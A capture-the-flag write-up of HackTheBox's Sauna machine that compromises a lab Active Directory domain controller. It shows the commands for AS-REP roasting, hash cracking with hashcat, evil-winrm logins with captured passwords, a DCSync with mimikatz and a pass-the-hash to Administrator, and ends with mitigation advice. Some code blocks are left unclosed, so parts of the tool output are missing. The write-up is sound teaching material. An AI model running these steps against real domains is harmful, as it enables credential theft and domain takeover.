## **Description**

Hello hackers, I hope you are doing well. We are doing [Sauna](https://app.hackthebox.com/machines/) from [HackTheBox](https://www.hackthebox.com).

## **Enumeration**

### nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.10.10.175

From the open ports we can safely assume this is an Active Directory Domain Controller with the domain name `EGOTISTICAL-BANK.LOCAL`.

### Web

There is web server on port 80 so let's navigate to the web page.

![](1.png)

It looks like this is a bank website.

Navigating through different pages on the website we find the employees names in the `about.html` page.

![](2.png)

Let's save the names to a file.


## **Foothold**

### AS-REP Roasting

One of the first attacks to try when obtaining a list of username is the `AS-REP Roasting` attack.

This attacks exploits users with `Kerberos pre-authentication` disabled, allowing the attacker to obtain a TGT(Ticket Granting Ticket) which part of it is encrypted using the user's password hash.

To start the attack, we can use `GetNPUsers.py` from `Impacket Scripts`.

```bash
GetNPUsers.py 'EGOTISTICAL-BANK.LOCAL/' -usersfile users.lst -no-pass -dc-ip EGOTISTICAL-BANK.LOCAL
```

Since we don't know the naming convention used by this bank, I tried multiple ones and the one that worked for me is `first letter of the first name` `+` `last name`.

![](3.png)

We got back the TGT for the user `fsmith`, now let's crack it using hashcat.

```bash
hashcat -m 18200 fsmith.hash /usr/share/wordlists/rockyou.txt

We got the password.

Since this is a Domain Controller, `winrm` is probably enabled, so let's using to connect to the target machine.

```bash
$ evil-winrm -i EGOTISTICAL-BANK.LOCAL -u fsmith -p Thestrokes23

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

*Evil-WinRM* PS C:\Users\FSmith\Documents> whoami

```

We got a shell!

## **Privilege Escalation**

### fsmith --> svc_loanmgr

Let's run `winpeas` and see what we can find.

![](4.png)

We manged to find `svc_loanmgr`'s password. let's connect to his account.

```bash
$ evil-winrm -i EGOTISTICAL-BANK.LOCAL -u svc_loanmgr -p 'Moneymakestheworldgoround!'                                                                1 тип

### svc_loanmgr --> Administrator

I ran `winpeas` again hoping to find something good but it didn't.

#### BloodHound

Let's upload `sharphound` to enumerate the machine.

```shell

We got the zip file, now let's download it to our machine and open it with `BloodHound`.

After loading the file we go to the search bar and search for our current user `svc_loanmgr`. On the `Node Info` tab we select `Outbound Object Control`, this will show us the items the `svc_loanmgr` user has rights over.

![](5.png)

We see that ther user has `GetChanges` and `GetChangeAll` right on the domain.

If we right click one of those rights and select `help` it will show us what to do to exploit it.

![](6.png)

Since we have those two rights, we can perform an attack called `DCsync attack`

On the `Windows Abuse` tab we find the command to run.

![](7.png)

This attack requires `mimikatz` to run the command:

```shell
lsadump::dcsync /domain:testlab.local /user:Administrator
```

Let's upload a copy of `mimikatz` to the target and run the command:

![](8.png)

We've successfully retrieved the `Administrator`'s NTLM hash.

Now using `evil-winrm`, let's connect to the target using `pass-the-hash` attack.

```shell
$ evil-winrm -i EGOTISTICAL-BANK.LOCAL -u administrator -H 823452073d75b9d1cf70ebdf86c7f98e

Evil-WinRM shell v3.4

Nice, we got Admin.

## **Prevention and Mitigation**

### AS-REP

Pre-authentication should be enabled for all account in the Domain Controller.

Enforce a complex password policy (long passwords with numbers and special characters) that's going to be difficult to crack. The passwords should also be changed frequently.

Implement MFA for Kerberos authentication.

### AutoLogon credentials

AutoLogon should be disabled and users should manually enter their credentials during each login. Also MFA can be used for better security.

### DCsync

Revoke the `GetChanges` and `GetChangesAll` rights from the compromised account.

Apply the principle of least privilege to all users and admin accounts in the domain.
